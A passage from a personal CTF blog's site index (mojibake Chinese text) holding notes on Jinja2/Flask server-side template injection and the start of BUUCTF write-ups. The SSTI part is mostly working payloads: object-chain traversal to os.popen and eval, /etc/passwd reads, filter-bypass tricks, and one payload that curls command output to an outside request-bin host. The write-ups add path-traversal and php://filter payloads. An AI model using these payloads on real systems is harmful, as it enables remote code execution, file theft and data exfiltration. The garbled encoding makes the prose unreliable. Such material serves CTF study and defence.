","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"sstiæ¨¡æ¿æ³¨å…¥","slug":"sstiæ¨¡æ¿æ³¨å…¥","date":"2021-06-25T04:19:20.000Z","updated":"2022-01-17T09:58:31.598Z","comments":true,"path":"2021/06/25/sstiæ¨¡æ¿æ³¨å…¥/","link":"","permalink":"https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"ä¸ä¼špythonçœ‹çš„æˆ‘å¥½æ‡µï¼Œä¸€äº›ç±»ã€å¯¹è±¡å’Œé­”æœ¯å˜é‡çš„éƒ¨åˆ†éƒ½ä¸æ˜¯å¤ªæ‡‚ã€‚ã€‚ã€‚ã€‚","text":"ä¸ä¼špythonçœ‹çš„æˆ‘å¥½æ‡µï¼Œä¸€äº›ç±»ã€å¯¹è±¡å’Œé­”æœ¯å˜é‡çš„éƒ¨åˆ†éƒ½ä¸æ˜¯å¤ªæ‡‚ã€‚ã€‚ã€‚ã€‚ sstiæ¦‚è¿°è´´ä¸ªå¤§ä½¬çš„æ–‡ç«  æµ…æSSTI(pythonæ²™ç›’ç»•è¿‡)_ç™½å¸½å­æŠ€æœ¯/æ€è·¯_iæ˜¥ç§‹ç¤¾åŒº-åˆ†äº«ä½ çš„æŠ€æœ¯ï¼Œä¸ºå®‰å…¨åŠ ç‚¹æ¸©åº¦. (ichunqiu.com) CTF SSTI(æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥) - MustaphaMond - åšå®¢å›­ (cnblogs.com) [å…³äºpythoné­”æœ¯æ–¹æ³•payloadï¼šâ€œâ€œ.class.mro2].subclasses()40.read() çš„è§£é‡Š_xiao__1baiçš„åšå®¢-CSDNåšå®¢ æ¨¡æ¿æ³¨å…¥æ€»ç»“_Herbert_555çš„åšå®¢-CSDNåšå®¢ SSTI(Server-Side Template Injection);å³æ¨¡æ¿æ³¨å…¥ï¼Œä¸æˆ‘ä»¬ç†ŸçŸ¥çš„SQLæ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ç­‰åŸç†å¤§åŒå°å¼‚ã€‚æ³¨å…¥çš„åŸç†å¯ä»¥è¿™æ ·æè¿°ï¼šå½“ç”¨æˆ·çš„è¾“å…¥æ•°æ®æ²¡æœ‰è¢«åˆç†çš„å¤„ç†æ§åˆ¶æ—¶ï¼Œå°±æœ‰å¯èƒ½æ•°æ®æ’å…¥äº†ç¨‹åºæ®µä¸­å˜æˆäº†ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œæ”¹å˜äº†ç¨‹åºçš„æ‰§è¡Œé€»è¾‘ï¼›æ¼æ´æˆå› åœ¨äºï¼šrender_templateå‡½æ•°åœ¨æ¸²æŸ“æ¨¡æ¿çš„æ—¶å€™ä½¿ç”¨äº†%sæ¥åŠ¨æ€çš„æ›¿æ¢å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬çŸ¥é“Flask ä¸­ä½¿ç”¨äº†Jinja2 ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œ{ { } }åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{ { } }åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚{ {1+1} }ä¼šè¢«è§£ææˆ2ã€‚ flask SSTIçš„åŸºæœ¬æ€è·¯å°±æ˜¯åˆ©ç”¨pythonä¸­çš„é­”æœ¯æ–¹æ³•æ‰¾åˆ°è‡ªå·±è¦ç”¨çš„å‡½æ•° __dict__ ä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸ __class__ è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡ __mro__ è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚ __bases__ è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±» &#x2F;&#x2F; __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ __subclasses__ æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨ __init__ ç±»çš„åˆå§‹åŒ–æ–¹æ³• __globals__ å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ ä¸ func_globals ç­‰ä»· flaskåŸºæœ¬çŸ¥è¯† flaské‡‡ç”¨è£…é¥°å™¨æ¥æŒ‡å®šè·¯ç”±ï¼Œé»˜è®¤çš„æ¨¡æ¿æ¸²æŸ“å¼•æ“ä¸ºJinja2ã€‚å…¶ä¸­æ¨¡æ¿çš„ä¸‰ç§ä¸»è¦è¯­æ³•ä¸º ï¼šè£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¸²æŸ“æ¨¡æ¿çš„æ—¶å€™ï¼Œå¯ä»¥ä¼ å…¥å˜é‡åå’Œå˜é‡å€¼æ¨¡æ¿ä¼šè‡ªåŠ¨æ›¿æ¢å˜é‡ä¸ºä¼ å…¥çš„å˜é‡å€¼ { % â€¦ % }:è£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥ :è£…è½½ä¸€ä¸ªæ³¨é‡Š æµç¨‹ï¼š â€‹ è·å–åŸºæœ¬ç±» â€‹ è·å–åŸºæœ¬ç±»çš„å­ç±» â€‹ æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±» â€‹ æŸ¥çœ‹å…¶å¼•ç”¨__builtins__ â€‹ è°ƒç”¨å…¶ä¸­å¯ç”¨çš„å‡½æ•° è·å–åŸºæœ¬ç±» â€‹ åˆ©ç”¨__bases__æˆ–è€…æ˜¯__mro__å‡½æ•° &#39;&#39;.__class__.__mro__[2] &#123;&#125;.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[8] &#x2F;&#x2F;é’ˆå¯¹jinjia2&#x2F;flaskä¸º[9]é€‚ç”¨ //å®è¯å®è¯´æœ€åä¸€ä¸ªä¸æ˜¯å¾ˆæ‡‚ è·å–åŸºç±»çš„å­ç±» â€‹ åˆ©ç”¨__subclasses__å‡½æ•° object.__subclasses__() &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;è¿™å¥å¯ä»¥æŸ¥æ‰¾æ‰€æœ‰çš„ç±» SSTIçš„ä¸»è¦ç›®çš„å°±æ˜¯ä»è¿™ä¹ˆå¤šå­ç±»ä¸­æ‰¾å‡ºå¯ä»¥åˆ©ç”¨çš„ç±»ï¼ˆä¸€èˆ¬æ˜¯æŒ‡è¯»å†™æ–‡ä»¶çš„ç±»ï¼‰åŠ ä»¥åˆ©ç”¨ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•æœ‰&lt;type &#39;file&#39;&gt;ç­‰ï¼Œï¼ˆä¸€èˆ¬fileåœ¨ç¬¬40å·ï¼‰ æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±» &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__ &lt;unbound method WarningMessage.__init__ æŸ¥çœ‹å…¶å¼•ç”¨__builtins__ &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;] ä½¿ç”¨osæ¨¡å—æ‰§è¡Œå‘½ä»¤æ¥è¯»å–flag &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) æ¥ã€å§¿åŠ¿ 1ã€config &#123;&#123;config&#125;&#125;å¯ä»¥è·å–å½“å‰ &#123;&#123;config&#125;&#125;å¯ä»¥è·å–å½“å‰è®¾ç½®ï¼Œå¦‚æœé¢˜ç›®ç±»ä¼¼app.config [&#39;FLAG&#39;] = os.environ.popï¼ˆ&#39;FLAG&#39;ï¼‰ï¼Œé‚£å¯ä»¥ç›´æ¥è®¿é—®&#123;&#123;config['FLAG']&#125;&#125;æˆ–è€…&#123;&#123;config.FLAG&#125;&#125;å¾—åˆ°flag 2ã€self &#123;&#123;self&#125;&#125; â‡’ &lt;TemplateReference None&gt; &#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; â‡’ åŒæ ·å¯ä»¥æ‰¾åˆ°config 3ã€&quot;&quot;ã€[]ã€()ç­‰æ•°æ®ç»“æ„ ä¸»è¦ç›®çš„æ˜¯é…åˆ__class__.__mro__[2]è¿™æ ·æ‰¾åˆ°objectç±»&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125; 4ã€url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, configç­‰ å¦‚æœconfigï¼Œselfä¸èƒ½ä½¿ç”¨ï¼Œè¦è·å–é…ç½®ä¿¡æ¯ï¼Œå°±å¿…é¡»ä»å®ƒçš„ä¸Šéƒ¨å…¨å±€å˜é‡ï¼ˆè®¿é—®é…ç½®current_appç­‰ï¼‰ã€‚ ä¾‹å¦‚ï¼š &#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125; &#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125; &#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125; å¸¸è§çš„è¿‡æ»¤ç»•è¿‡ (1)åªè¿‡æ»¤[] pop() å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()è‹¥.ä¹Ÿè¢«è¿‡æ»¤ï¼Œä½¿ç”¨åŸç”ŸJinJa2å‡½æ•°|attr()å°†request.__class__æ”¹æˆrequest|attr(&quot;__class__&quot;) (2)è¿‡æ»¤_ åˆ©ç”¨request.argså±æ€§&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__å°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚ (3)å…³é”®å­—è¿‡æ»¤ base64ç¼–ç ç»•è¿‡__getattribute__ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³• ä¾‹å¦‚è¢«è¿‡æ»¤æ‰__class__å…³é”®è¯&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()&#125;&#125; å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()&#125;&#125;&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125; (4)è¿‡æ»¤{ { ä½¿ç”¨&#123;% if ... %&#125;1&#123;% endif %&#125;ï¼Œä¾‹å¦‚ &#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; | grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125; å¦‚æœä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¯»å–æ–‡ä»¶å¯ä»¥åˆ©ç”¨ç›²æ³¨çš„æ–¹æ³•é€ä½å°†å†…å®¹çˆ†å‡ºæ¥ &#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125; (5)å¼•å·å†…åå…­è¿›åˆ¶ç»•è¿‡ &#123;&#123;&quot;&quot;.__class__&#125;&#125; &#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;]&#125;&#125; _&#96;æ˜¯&#96;\\x5f&#96;ï¼Œ&#96;.&#96;æ˜¯&#96;\\x2E (6)&quot; &#39; chrç­‰è¢«è¿‡æ»¤ï¼Œæ— æ³•å¼•å…¥å­—ç¬¦ä¸² ç›´æ¥æ‹¼æ¥é”®å dict(buil&#x3D;aa,tins&#x3D;dd)|join() åˆ©ç”¨stringã€popã€listã€sliceã€firstç­‰è¿‡æ»¤å™¨ä»å·²æœ‰å˜é‡é‡Œé¢ç›´æ¥æ‰¾ (app.__doc__|list()).pop(102)|string() æ„é€ å‡º%å’Œcåï¼Œç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»£æ›¿chr &#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join %&#125; # uld&#x3D;%c &#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125; (7)+ç­‰è¢«è¿‡æ»¤ï¼Œæ— æ³•æ‹¼æ¥å­—ç¬¦ä¸² ~åœ¨jinjaä¸­å¯ä»¥æ‹¼æ¥å­—ç¬¦ä¸² æ ¼å¼åŒ–å­—ç¬¦ä¸²åŒä¸Š ä¾‹ä¸€ï¼šwarnings.catch_warningsç±» &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; PSï¼šç”±äºä½¿ç”¨[â€˜globalsâ€™]ä¼šé€ æˆ500çš„æœåŠ¡å™¨é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”å½“æˆ‘ç›´æ¥è¾“å…¥search=globalsæ—¶é¡µé¢ä¹Ÿä¼š500ï¼Œè§‰å¾—è¿™é‡Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼[â€˜gloâ€™+&#39;balsâ€™] æœ€åè·å–flag &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125; ä¾‹äºŒï¼š classâ€™site._Printerâ€™ç±» &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; è·å–flag &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125; ä¾‹ä¸‰ï¼špopen &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125; wpæ­äº†ä¸ªé¶åœº level 1å…ˆæ‰¾åŸºæœ¬ç±» å†è·å–åŸºæœ¬ç±»çš„å­ç±» æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±» &#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125; æŸ¥çœ‹å…¶å¼•ç”¨__builtins__ åˆ©ç”¨evalå‘½ä»¤æ‰§è¡Œæ¥è¯»å–flag &#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125; level 2è¿™ä¸ªè¿‡æ»¤äº†{ { ï¼Œæ‰€ä»¥è¦é‡‡ç”¨{ % % }çš„å½¢å¼ { % % }å†…åŠ æ§åˆ¶è¯­å¥ ä¸”è¿™é‡Œå±•ç¤ºæ•°æ®è¦åˆ©ç”¨{ % print % } &#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125; è¿˜æœ‰ä¸€ç§æ˜¯åˆ©ç”¨æ§åˆ¶è¯­å¥ å¯»æ‰¾ç¬¦åˆæ¡ä»¶çš„å­ç±»å†åˆ©ç”¨WarningMessageçš„__bulitins__æ‰§è¡Œä»£ç è¿™ä¸ªè¿˜ä¸å¤ªæ‡‚å…ˆè´´ä¸€ä¸‹payload &#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125; è¡¥: &#123;%if sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125; è¦åˆ©ç”¨&lt;class â€˜warnings.catch_warningsâ€™&gt;æ¥è°ƒç”¨eval osç­‰å‘½ä»¤&lt;class â€˜warnings.catch_warningsâ€™&gt;ä¸€èˆ¬ä½ç½®ä¸º59ï¼Œå¯ä»¥ç”¨å®ƒæ¥è°ƒç”¨fileã€osã€evalã€commandsç­‰ è°ƒç”¨file &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() #æŠŠ read() æ”¹ä¸º write() å°±æ˜¯å†™æ–‡ä»¶ import os [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read() è°ƒç”¨eval [].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;) è°ƒç”¨systemæ–¹æ³•ã€‚ï¼ˆä¸åŒ…å«systemï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤systemçš„æƒ…å†µï¼‰ [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;) åˆ©ç”¨commandsè¿›è¡Œå‘½ä»¤æ‰§è¡Œ &#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125; level 3åœ¨å­¦äº†åœ¨å­¦äº†ï¼ˆ [GYCTF2020]FlaskAppé¢˜ç›®é‡Œæœ‰base64åŠ å¯†ã€è§£å¯†å’Œä¸€ä¸ªæç¤ºé¡µé¢ï¼Œè¯•ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“è§£å¯†æ¡†å­˜åœ¨sstiæ³¨å…¥ï¼Œä¸”å½“æŠ¥é”™æ—¶ä¼šè¿›å…¥debugæ¨¡å¼åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸€éƒ¨åˆ†æºç  è¯•ç€è®¿é—®appã€‚py &#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†ä¸€äº›å†…å®¹ å†æŸ¥æ‰¾ç›®å½•å†…å†…å®¹ &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; os.listdir() æ–¹æ³•ç”¨äºè¿”å›æŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨ã€‚ çœ‹è§ä¸€ä¸ªthis_is_the_flag.txt å°è¯•å»è®¿é—®,å¾—åˆ°flag &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125; &#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¹Ÿå¯ä»¥åˆ©ç”¨åˆ‡ç‰‡çš„æ–¹å¼ &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[],"tags":[{"name":"webå­¦ä¹ ","slug":"webå­¦ä¹ ","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"sstiæ³¨å…¥","slug":"sstiæ³¨å…¥","permalink":"https://ethe448.github.io/tags/ssti%E6%B3%A8%E5%85%A5/"}]},{"title":"buuåˆ·é¢˜è®°å½•","slug":"buuåˆ·é¢˜è®°å½•","date":"2021-06-16T20:26:18.000Z","updated":"2022-01-17T08:32:44.660Z","comments":true,"path":"2021/06/17/buuåˆ·é¢˜è®°å½•/","link":"","permalink":"https://ethe448.github.io/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"è®°å½•ä¸€ä¸‹è‡ªå·±buuçš„åˆ·é¢˜è¿›åº¦ï¼Œç•™ä¸‹ç‚¹wpæ–¹ä¾¿ä»¥åçœ‹ å»ºè®®æŒ‚æ¢¯å­ï¼Œä¸ç„¶å›¾ç‰‡åŠ è½½ä¼šå¾ˆæ…¢","text":"è®°å½•ä¸€ä¸‹è‡ªå·±buuçš„åˆ·é¢˜è¿›åº¦ï¼Œç•™ä¸‹ç‚¹wpæ–¹ä¾¿ä»¥åçœ‹ å»ºè®®æŒ‚æ¢¯å­ï¼Œä¸ç„¶å›¾ç‰‡åŠ è½½ä¼šå¾ˆæ…¢ [HCTF 2018]WarmUp è¿›å…¥åçœ‹åˆ°æ»‘ç¨½è¡¨æƒ…ï¼ŒæŸ¥çœ‹æºç çœ‹åˆ°æœ‰source.php çœ‹åˆ°phpä»£ç  è¦æ±‚ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„fileï¼Œä¸”éœ€æ»¡è¶³class emmmä¸­çš„æ¡ä»¶ &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;]; åˆ¤æ–­ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸”æ˜¯å¦ä¸ºstringç±»å‹ if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#39;t see it&quot;; return false; &#125; åˆ¤æ–­ä¼ å…¥çš„å‚æ•°ä¸­æ˜¯å¦æœ‰ç™½åå•å†…çš„å†…å®¹ if (in_array($page, $whitelist)) &#123; return true; &#125; mb_substr()å‡½æ•°åˆ‡å‰²å‚æ•°ä»0åˆ°ç¬¬mb_strpos()å‡½æ•°è¿”å›çš„æ•°å€¼ $_page &#x3D; mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); åˆ¤æ–­åˆ‡å‰²åçš„å‚æ•°æ˜¯å¦åœ¨ç™½åå•ä¸­ if (in_array($_page, $whitelist)) &#123; return true; &#125; åˆ‡å‰²åçš„å‚æ•°ç»è¿‡urlè§£ç åå†è¿›è¡Œä¸€æ¬¡è¿‡æ»¤ $_page &#x3D; urldecode($page); $_page &#x3D; mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#39;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) ifå†…ä¸ºçœŸæ—¶è¿›è¡Œæ–‡ä»¶åŒ…å« &#123; include $_REQUEST[&#39;file&#39;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;; &#125; ç”±äºhint.phpä¸­æç¤ºflagåœ¨ffffllllaaaaggggä¸­ä¸”whitelistä¸­ä»…æœ‰source.phpå’Œhint.php æ‰€ä»¥ä¼ å…¥ file=hint.php?ffffllllaaaagggg æ— å›æ˜¾ åå¤šæ¬¡åˆ©ç”¨../æŸ¥çœ‹ä¸Šçº§ç›®å½• æœ€ç»ˆpayloadä¸º file=hint.php?/../../../../ffffllllaaaagggg [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret Fileè¿›å…¥åçœ‹åˆ°è¿™ä¸ªç•Œé¢ æŸ¥çœ‹æºç å¯ä»¥æ‰¾åˆ°Archive_room.php å‘ç°è¿™ä¸ªé¡µé¢ ç‚¹å‡»æŒ‰é’®åé¡µé¢ å°è¯•æŠ“åŒ…å‘ç°secr3t.php è®¿é—®å¾—åˆ°phpä»£ç  æ˜¯æ–‡ä»¶åŒ…å«ï¼Œflagåœ¨flag.phpä¸­ï¼Œè¿‡æ»¤äº†../,tp,input,date. åˆ©ç”¨php://filterç»•è¿‡ æ„é€ file=php://filter/read=convert.base64-encode/resource=flag.php base64è§£ç åå¾—åˆ°flag åŸºç¡€éªŒè¯ è¿›å…¥åçŒœæµ‹ç”¨æˆ·åä¸ºadmin å¯†ç ä¸º123456è¿›è¡ŒæŠ“åŒ… å‘ç°å­˜åœ¨ä¸€è¡ŒAuthorization: Basic YWRtaW46MTIzNDU2 çŒœæµ‹YWRtaW46MTIzNDU2ä¸ºbase64åŠ å¯†ï¼›è¿›è¡Œè§£ç  å°è¯•é€šè¿‡bpç”¨é™„ä»¶ä¸­çš„å¯†ç è¿›è¡Œçˆ†ç ´ï¼Œ ä¸ºå¯†ç æ·»åŠ å‰ç¼€ä¸ºadminï¼šä¸”è¦è¿›è¡Œbase64åŠ å¯†çš„è§„åˆ™ çˆ†ç ´åå‘ç°å­˜åœ¨ä¸€ä¸ªé•¿åº¦ä¸åŒä¸å…¶ä»–åŒ…çš„ è¿›è¡Œå‘åŒ…æŸ¥çœ‹å…¶å“åº”å¯å‘ç°flag ç›®å½•éå†è¿›å…¥åå‘ç°æœ‰å››ä¸ªç›®å½•ï¼Œ ä¾æ¬¡å¯»æ‰¾å¯æ‰¾åˆ°flag.txtæ–‡ä»¶ ./ 